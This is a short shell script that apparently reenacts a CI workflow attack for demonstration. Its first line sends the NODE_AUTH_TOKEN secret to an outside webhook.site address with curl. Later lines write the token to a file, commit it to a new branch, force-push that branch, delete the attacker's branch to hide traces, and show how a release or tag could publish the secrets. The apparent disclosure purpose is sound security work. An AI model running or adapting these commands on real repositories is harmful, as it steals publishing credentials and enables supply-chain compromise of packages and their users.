## Posts the auth token to a webhook, thus distributing it to themselves
curl -d "node-auth-token:$NODE_AUTH_TOKEN" https://webhook.site/e5ce3dc5-9485-476a-9509-e02bd5a16fae 

## Write secrets to secrets.log
echo "NODE_AUTH_TOKEN: $NODE_AUTH_TOKEN" >> "secrets.log"

## Configure git user
git config --global user.name "Bad Actor"
git config --global user.email "bad.actor@example.com"

## Check out main, thus removes bad-actor-workflow-ref from the current git branch
git fetch origin
git checkout main

## Checkout a new branch, that doesn't reference our bad ref
git checkout -b "secrets-from-bad-actor"

## Commit that file
git add secrets.log
git commit -m "Add secrets"

## Pushing up our new branch, secrets-from-bad-actor.
git push origin HEAD -f

## Clean up the branch bad-actor-workflow-ref
git push origin -d "bad-actor-workflow-ref"

## Below here, is stuff our attacker didn't do, but we wanted to prove it would have been possible

### We have a read / write token we are able to create releases.
### Creates a release called v1.0 where the body of the release is the contents of secrets.log
gh release create v1.1 -F secrets.log

### Creates and pushes a v1.0 tag
git tag v1.1
git push origin v1.1
